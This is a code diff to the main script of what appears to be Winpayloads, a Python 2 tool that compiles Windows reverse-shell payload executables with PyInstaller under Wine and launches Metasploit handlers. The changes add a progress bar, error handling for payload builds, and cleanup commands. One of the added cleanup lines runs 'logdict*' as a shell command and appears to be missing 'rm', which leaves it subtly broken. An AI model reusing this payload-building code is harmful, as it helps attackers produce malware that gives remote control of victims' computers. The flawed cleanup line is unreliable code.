@@ -2,7 +2,7 @@
 from lib.main import *
 from lib.payloadextras import *
 from lib.startmetasploit import *
-
+from progress.bar import Bar
 
 if not re.search('winpayloads', os.getcwd().lower()):
     print t.bold_red + "[!!] Please Run From Winpayloads Dir" + t.normal
@@ -145,8 +145,19 @@ try:
             Filesave.close()
 
         print '[*] Creating Payload using Pyinstaller...'
-        subprocess.call(['wine', '/root/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller-2.0/pyinstaller.py',
-                         '%s/payload.py' % payloaddir, '--noconsole', '-F', '-y', '-o', payloaddir], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        p = subprocess.Popen(['wine', '/root/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller-2.0/pyinstaller.py',
+                         '%s/payload.py' % payloaddir, '--noconsole', '-F', '-y', '-o', payloaddir], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        bar = Bar('Processing', max=10)
+        print t.bold_green
+        for i in range(10):
+            bar.next()
+            time.sleep(1)
+        bar.finish()
+        payloadstderr = p.stderr.read()
+        if re.search('error',payloadstderr.lower()):
+            print t.bold_red + '[*] Error In Creating Payload... Exiting..\n' + t.normal + payloadstderr
+            raise KeyboardInterrupt
+
         print '[*] Cleaning Up...'
         if menuchoice == '1':
             payloadname = 'ReverseStagelessShell.exe'
@@ -246,10 +257,13 @@ try:
             METASPLOIT().methttp_normal(portnum)
 
     raise KeyboardInterrupt
+
 except KeyboardInterrupt:
     print t.bold_green + '\n[*] Cleaning Up\n' + t.normal
     subprocess.call(['rm *.rc'], shell=True,
                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     subprocess.call(['rm *.ps1'], shell=True,
+                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    subprocess.call(['logdict*'], shell=True,
                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     sys.exit()
